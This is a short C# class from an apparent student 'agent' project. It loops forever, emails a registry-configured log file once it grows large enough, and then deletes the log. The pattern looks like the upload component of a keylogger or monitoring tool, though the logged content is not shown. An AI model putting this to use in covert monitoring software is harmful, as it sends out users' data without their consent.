using Agente;
using Common;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading;

namespace AgenteTcc
{
    public class Transferencia
    {
        private static bool TamanhoLogEhValido()
        {


            string caminhoLog = RegistryMemore.DestinoLog;

            if (!File.Exists(caminhoLog))
                return false;

            FileInfo fileInfo = new FileInfo(caminhoLog);
            long length = fileInfo.Length / 1024;
            if (length < RegistryMemore.TamanhoLog)
                return false;
            return true;
        }

        private static void EnviarArquivo()
        {
            Email email = new Email();
            email.Send();
        }

        public static void IniciarTransferencia()
        {
            while (true)
            {

                if (!TamanhoLogEhValido())
                {
                    Thread.Sleep(RegistryMemore.IntervaloEnvio * 1000);
                    continue;
                }

                while (true)
                {
                    if (!Internet.IsConnected())
                    {
                        Thread.Sleep(RegistryMemore.IntervaloEnvio * 2000);
                        continue;
                    }

                    try
                    {
                        EnviarArquivo();

                        new Log().Deletar();

                        break;
                    }
                    catch
                    {
                        Thread.Sleep(RegistryMemore.IntervaloEnvio * 2000);
                        continue;
                    }
                }
            }
        }

    }
}
